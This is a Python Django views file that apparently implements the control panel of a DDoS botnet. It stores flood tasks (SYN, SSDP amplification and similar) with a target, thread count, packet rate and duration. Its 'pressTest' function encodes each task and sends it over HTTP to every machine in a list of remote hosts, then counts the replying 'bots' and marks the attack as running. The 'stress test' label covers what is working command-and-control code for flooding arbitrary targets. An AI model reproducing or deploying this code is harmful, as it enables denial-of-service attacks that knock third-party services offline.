#-*- coding:utf-8 -*-
from django.shortcuts import render
from django.http import HttpResponse
from django.http import HttpResponseRedirect
from coreapp.models import Tasklist,Machinelist
from coreapp.functions import findall,finddata,savedata,updatedata,deldata
from coreapp.functions import encodedata
import hashlib
import random
import string
import urllib2,urllib
import datetime
# Create your views here.
def tasklist(request):
    localtime = datetime.datetime.now().strftime('%b-%d-%Y %H:%M:%S')
    res = findall(Tasklist)
    return render(request,'coreapp/tasklist.html',{'tasklists':res,'localtime':localtime})
    #return render(request,'coreapp/tasklist.html')
def showConfig(request,category):
    res = ""
    page_jmp = ""
    number = int(category)
    leader = {"1":"dominate","2":"ssyn","3":"xsyn","4":"ssdp_amp","5":"syn"}
    try:
       res = leader[str(number)]
       if res == "dominate" or res == "ssyn":
           page_jmp = "coreapp/setconf_1.html"
       #return HttpResponse(res)   
       return render(request,page_jmp,{'flag':res,})
    except:
       res = "nothing"
       return HttpResponse(res)
def setConfig(request):
    if request.method == 'POST':
       category = request.POST['category']
       target = request.POST['target']
       threads = request.POST['threads']
       timer = request.POST['timer']
       pressure = request.POST['pressure']
       if category == "dominate" or category == "ssyn":
            pps = request.POST['pps']
            #target_hash = hashlib.md5(target).hexdigest()
            #key = target_hash[1:6] + ''.join(random.choice(string.lowercase) for i in range(3))
            cmds = category + " " + target + " " + str(threads) +" " + str(pps) + " " + str(timer)
            #res = encodedata(cmd)
       elif category =="xxxxx":
            return HttpResponse("ssyn")
       else:
            return HttpResponse("404")
       #data = {"target":target}
       #res = finddata(Tasklist,data)
       #if res == None:
       data2 = {"category":category,"parameters":cmds,"target":target,"pressure":pressure,"timer":timer}
       res2 = savedata(Tasklist,data2)
       if res2 == 1:
            return HttpResponseRedirect('/tasklist')
       else:
            return HttpResponse('<html><script type="text/javascript">alert("The target info store failure!"); window.location="/tasklist"</script></html>')
       #else:
       #return HttpResponse('<html><script type="text/javascript">alert("The target has existed!"); window.location="/tasklist"</script></html>')
def delTask(request,ids):
    taskid = int(ids)
    data = {"id":taskid}
    res = deldata(Tasklist,data)
    if res :
         return HttpResponseRedirect('/tasklist')
    else:
         return HttpResponse('<html><script type="text/javascript">alert("The task delete failure!"); window.location="/tasklist"</script></html>')
def pressTest(request,ids):
    taskid = int(ids)
    res0 = finddata(Tasklist,{"state":1})
    if res0 != None:
         return HttpResponse('<html><script type="text/javascript">alert("There existing task running!"); window.location="/tasklist"</script></html>')
    data = {"id":taskid}
    res = finddata(Tasklist,data)
    if res != None:
         target_hash = hashlib.md5(res.target).hexdigest()
         cmds = res.parameters
         cmds = target_hash[1:6] + '$:::$' + cmds.replace(' ', ':::') + '$:::$' +''.join(random.choice(string.lowercase) for i in range(3)) + '$:::$' + res.target
         cmds_res = encodedata(cmds)
         datapost = urllib2.quote(cmds_res)
         '''
         get machine test
         '''
         content = ""
         res_m = findall(Machinelist)
         flags = []
         if res_m != None:
              for cell in res_m:
                  link = "http://" + cell.addr + ":" + str(cell.port) +  "/control/" + datapost
                  try:
                      response = urllib2.urlopen(link,timeout = 15)
                      content = content + "<br>[*]" + cell.addr + ":reply " + response.read() 
                      response.close()
                      flags.append(1)
                  except:
                      content = content + "<br>[*]" + cell.addr + ":reply connect fail!"
         if len(flags) >0:
              nowtime = datetime.datetime.now()
              endtime = nowtime + datetime.timedelta(seconds = int(res.timer))
              data2 = {"state":1,"detail":"bots:" + str(len(flags)) + ","+nowtime.strftime('%b-%d-%Y %H:%M:%S') + "-" + endtime.strftime('%b-%d-%Y %H:%M:%S')}
              updatedata(Tasklist,data,data2)
    return HttpResponse(content+'<a href = "/tasklist" >return</a>')
def stopTask(request,ids):
    taskid = int(ids)
    data = {"id":taskid}
    res = finddata(Tasklist,data)
    if res != None:
         data2 = {'state':0,'detail':""}
         updatedata(Tasklist,data,data2)
    return HttpResponseRedirect('/tasklist')
